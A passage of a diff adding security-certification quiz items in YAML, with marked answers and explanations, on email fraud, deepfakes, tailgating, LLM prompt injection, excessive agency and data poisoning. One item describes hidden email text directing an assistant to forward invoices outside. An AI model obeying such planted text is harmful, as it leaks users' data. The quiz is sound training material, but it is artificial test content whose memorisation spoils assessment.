+    Accounts payable receives an email from "Dana Whitfield (CEO)" asking to change a supplier's
+    bank details before 3 p.m. and to keep it confidential. Its headers show the domain
+    `xn--ferres-svf.example`, a Reply-To at a webmail service and `dmarc=fail`. Which control
+    would MOST effectively prevent a loss from this type of attack?
+  options:
+    - text: "Confirming every change of payment details by calling the supplier on a number already on file"
+      correct: true
+    - text: "Replying to the email to ask the sender to confirm the request"
+    - text: "Blocking all email attachments from external senders"
+    - text: "Requiring the CEO to use a longer password"
+  explanation: |
+    This is business email compromise using a homograph lookalike domain. Out-of-band verification
+    through a known number defeats it however convincing the message is. Replying goes to the
+    attacker's Reply-To address. The request needs no attachment. The CEO's real account was not
+    used, so a stronger CEO password would not help.
+
+- key: sec-medium-37
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, deepfake, whaling]
+  prompt: |
+    A finance manager joins a video call in which the chief financial officer and two colleagues,
+    all looking and sounding normal, instruct urgent confidential transfers to a new account.
+    Afterwards it emerges that every other participant was synthetic. Which control would MOST
+    effectively have prevented the transfers?
+  options:
+    - text: "A payment procedure requiring call-back verification through known numbers and a second approver"
+      correct: true
+    - text: "A DMARC policy of p=reject on the company's domain"
+    - text: "Training staff to look for spelling mistakes in emails"
+    - text: "Requiring video rather than audio for all payment requests"
+  explanation: |
+    Deepfakes make faces and voices unreliable as proof of identity, so the control must not depend
+    on recognizing people: verify through a separate, known channel and require two people for
+    large payments. DMARC protects email, not video calls. Spelling checks do not apply to a live
+    call. Requiring video is exactly what the deepfake already defeated.
+
+- key: sec-medium-38
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.5, physical-attacks, tailgating]
+  prompt: |
+    A door controller shows one badge read and a "Door Held Open" alarm (open 45 seconds, limit
+    30) at a depot staff entrance, and the camera shows two people entering. Which attack occurred,
+    and which control would BEST prevent it?
+  options:
+    - text: "Tailgating, prevented by an access vestibule that admits one person per badge"
+      correct: true
+    - text: "Shoulder surfing, prevented by privacy screens"
+    - text: "Skimming, prevented by tamper-evident seals on the reader"
+    - text: "Forced entry, prevented by stronger door frames"
+  explanation: |
+    Two people entering on one badge is tailgating, and a vestibule (or turnstile) physically
+    allows only one person per authorization. Shoulder surfing is watching someone enter a PIN or
+    password. Skimming copies cards from a tampered reader. Nothing was forced: the door was opened
+    with a valid badge and held.
+
+- key: sec-medium-39
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.6, prompt-injection, indirect]
+  prompt: |
+    An email-summarizing assistant processes an incoming message whose white-on-white text tells
+    "the AI" to forward the latest invoices to an outside address. The assistant then tries to call
+    its send-mail tool. The user asked only for a summary. Which attack is this?
+  options:
+    - text: "Indirect prompt injection"
+      correct: true
+    - text: "Direct prompt injection"
+    - text: "Data poisoning"
+    - text: "Evasion"
+  explanation: |
+    The instructions arrived inside external content the model processed, not from the user, which
+    OWASP defines as indirect prompt injection (LLM01). Direct injection is typed by the user. Data
+    poisoning corrupts training or knowledge-base data in advance, and evasion crafts inputs to make
+    a classifier misjudge them. Least-privilege tools and approval before actions limit the damage.
+
+- key: sec-medium-40
+  type: multiple
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.6, code-execution, excessive-agency]
+  prompt: |
+    A developer's AI agent passes the model's answers to Python's `eval()` to compute values, and it
+    can call a `delete_records` tool using an administrator token. Which two risks from OWASP's Top
+    10 for LLM Applications does this design show? (Choose two.)
+  options:
+    - text: "Improper Output Handling (LLM05)"
+      correct: true
+    - text: "Excessive Agency (LLM06)"
+      correct: true
+    - text: "Misinformation (LLM09)"
+    - text: "Vector and Embedding Weaknesses (LLM08)"
+    - text: "System Prompt Leakage (LLM07)"
+  explanation: |
+    Running model output through `eval()` lets a manipulated answer execute code: improper output
+    handling (LangChain's CVE-2023-29374 was this pattern). A tool with administrator rights lets a
+    manipulated model do damage: excessive agency. Parse output as data and check it against an
+    allow list, and give tools least privilege. Misinformation concerns false answers, LLM08
+    concerns retrieval stores, and LLM07 concerns exposure of the system prompt; none is shown.
+
+- key: sec-medium-41
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.6, poisoning]
+  prompt: |
+    A mail provider retrains its spam classifier every week on messages that users mark as "not
+    spam". An attacker opens thousands of accounts and marks its own campaign messages "not spam".
+    After the next retraining, the campaign reaches inboxes. Which attack is this?
+  options:
+    - text: "Data poisoning"
+      correct: true
+    - text: "Evasion"
+    - text: "Jailbreaking"
+    - text: "Hallucination"
+  explanation: |
+    The attacker corrupted the data the model learns from, so the retrained model itself is wrong:
+    data poisoning (OWASP LLM04, and one of NIST AI 100-2's attack classes). Evasion would craft
+    individual messages to fool an unchanged model at decision time. Jailbreaking targets a
+    generative model's safety rules. A hallucination is a model's own invented output, not an
+    attack. Controlling and reviewing training data sources is the defense.
+
+- key: sec-medium-42
+  type: single
+  category: threats-vulnerabilities-and-attacks
+  tags: [obj-2.6, data-loss, privacy]
+  prompt: |
+    Staff in the legal team paste customer contracts into a free public AI chatbot to get
+    summaries. Which of the following BEST reduces the risk of data loss while keeping the
+    benefit?
+  options:
+    - text: "Provide an approved enterprise AI service with contractual data protection, and use DLP to block uploads to unapproved AI sites"
+      correct: true
+    - text: "Ask staff to delete their chat history after each use"
+    - text: "Enable jailbreak filtering on the public chatbot"
+    - text: "Fine-tune the public chatbot on the company's contract policies"
+  explanation: |
+    The risk is confidential data leaving the company's control (OWASP LLM02, Sensitive Information
+    Disclosure), as in Samsung's 2023 incident. An approved service with data protection terms gives
+    staff a safe alternative, and data loss prevention stops the unsafe one. Deleting history does
+    not undo what the provider already received. Jailbreak filters protect the model's rules, not
+    your data. Fine-tuning a public model would send it even more confidential material.
